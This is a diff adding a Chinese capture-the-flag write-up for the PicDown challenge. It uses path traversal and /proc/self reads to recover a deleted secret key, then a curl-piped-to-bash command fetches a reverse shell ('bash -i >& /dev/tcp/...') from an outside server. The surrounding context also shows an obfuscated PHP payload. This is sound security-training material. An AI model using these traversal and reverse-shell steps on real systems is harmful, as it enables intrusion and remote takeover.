@@ -555,3 +555,106 @@ payload`?code=(~%9E%8C%8C%9A%8D%8B)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9
 
 也可以直接用蚁剑`bypass_disable_function`模块的`GC_UAF`模式或者`Backtrace UAF`模式来执行shell
 
+
+
+
+
+
+
+
+
+## [网鼎杯 2020 白虎组]PicDown
+
+1. 非预期解,直接进行任意文件读取,传入`../../../../../../../flag`
+
+2. 非预期解
+
+已知存在任意文件读取,对`/proc/PID/cmdline`进行读取,可以得知启动该进程的命令行(不知道当前进程的PID的情况下可以用`self`代替)
+
+[https://zh.wikipedia.org/wiki/Procfs](https://zh.wikipedia.org/wiki/Procfs)
+
+- `/proc/PID/cmdline`启动该进程的命令行
+- `/proc/PID/cwd`当前工作目录的符号链接
+- `/proc/PID/environ`影响进程的环境变量的名字和值
+- `/proc/PID/exe`最初的可执行文件的符号链接,如果它还存在的话
+- `/proc/PID/fd`一个目录,包含每个打开的文件描述符的符号链接
+- `/proc/PID/fdinfo`一个目录,包含每个打开的文件描述符的位置和标记
+- `/proc/PID/maps`一个文本文件包含内存映射文件与块的信息
+- `/proc/PID/mem`一个二进制图像(image)表示进程的虚拟内存,只能通过ptrace化进程访问
+- `/proc/PID/root`该进程所能看到的根路径的符号链接。如果没有chroot监狱,那么进程的根路径是`/`
+- `/proc/PID/status`包含了进程的基本信息,包括运行状态,内存使用
+- `/proc/PID/task`一个目录包含了硬链接到该进程启动的任何任务
+
+传入`../../../../../../../proc/self/cmdline`,返回`python2app.py`,因此可以对`app.py`进行读取
+
+```python
+from flask import Flask, Response
+from flask import render_template
+from flask import request
+import os
+import urllib
+
+app = Flask(__name__)
+
+SECRET_FILE = "/tmp/secret.txt"
+f = open(SECRET_FILE)
+SECRET_KEY = f.read().strip()
+os.remove(SECRET_FILE)
+
+
+@app.route('/')
+def index():
+    return render_template('search.html')
+
+
+@app.route('/page')
+def page():
+    url = request.args.get("url")
+    try:
+        if not url.lower().startswith("file"):
+            res = urllib.urlopen(url)
+            value = res.read()
+            response = Response(value, mimetype='application/octet-stream')
+            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
+            return response
+        else:
+            value = "HACK ERROR!"
+    except:
+        value = "SOMETHING WRONG!"
+    return render_template('search.html', res=value)
+
+
+@app.route('/no_one_know_the_manager')
+def manager():
+    key = request.args.get("key")
+    print(SECRET_KEY)
+    if key == SECRET_KEY:
+        shell = request.args.get("shell")
+        os.system(shell)
+        res = "ok"
+    else:
+        res = "Wrong Key!"
+
+    return res
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+```
+
+可以通过访问`/no_one_know_the_manager`来执行命令,但是`SECRET_KEY`已经被删除,因此需要对其进行恢复
+
+[https://serverfault.com/questions/168909/relinking-a-deleted-file](https://serverfault.com/questions/168909/relinking-a-deleted-file)
+
+虽然文件被`os.remove`移除,但文件仍然处于打开状态,因此可以通过`/proc/self/fd/xxx`来读取
+
+读取`/proc/self/fd/3`时返回`pYwwx6bVqieykuQNCf2WfROameGd1t66ZkDrWoiEkHQ=`,但是执行的命令没有回显,需要反弹shell
+
+在服务器上将`bash -i >& /dev/tcp/108.61.157.50/8888 0>&1`写入到`shell.txt`中
+
+`python3 -m http.server 80`建立一个简易的http服务,并且`nc -lvvp 8888`监听8888端口
+
+访问`/no_one_know_the_manager?key=pYwwx6bVqieykuQNCf2WfROameGd1t66ZkDrWoiEkHQ%3d&shell=curl+http%3a//108.61.157.50/shell.txt+|+bash`得到反弹shell
+
+![image-20210503133747698](image-20210503133747698.png)
+
